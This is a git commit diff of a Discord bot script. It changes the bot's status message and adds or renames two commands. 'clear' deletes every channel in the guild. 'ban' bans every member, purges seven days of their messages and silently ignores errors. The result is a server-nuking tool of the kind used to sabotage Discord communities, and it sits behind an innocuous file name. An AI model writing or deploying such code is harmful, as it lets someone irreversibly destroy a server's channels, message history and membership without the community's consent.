008d0db1f85140bb11cb9886ab646b5af5648ae2
J4ck0505 <80529490+J4ck0505@users.noreply.github.com>
2021-04-21 03:46:17 +0900

    Update clean.py

--- clean.py
+++ clean.py
@@ -12,7 +12,7 @@ async def on_ready():
   # [discord.Status.online = 온라인],[discord.Status.idle = 자리비움],[discord.Status.dnd = 다른용무],[discord.Status.offline = 오프라인]
   await client.change_presence(status=discord.Status.online)
 
-  await client.change_presence(activity=discord.Game(name="호우"))
+  await client.change_presence(activity=discord.Game(name="Persona 3"))
   #await client.change_presence(activity=discord.Streaming(name="스트림 방송중", url='링크'))
   #await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name="노래 듣는중"))
   #await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="영상 시청중"))
@@ -20,15 +20,19 @@ async def on_ready():
   print("Aigis:",client.user.name,"819929289759653928:",client.user.id,"3:",discord.__version__)
 
 @client.command()
-async def test(ctx):
+async def clear(ctx):
     guild = ctx.guild
     for channel in guild.channels:
         await channel.delete()
-        
-@client.event
-async def test2(ctx):
-    guild = ctx.guild
-      await guild.create_text_channel('yess')
-      
+
+@client.command()
+async def ban(ctx):
+    for member in list(ctx.guild.members):
+      try:
+        await member.ban(reason="pooooop", delete_message_days=7)
+        print(f"Banned {member.display_name}!")
+        print("Banning is complete!")
+      except Exception:
+        pass
 
 client.run(os.environ['token'])
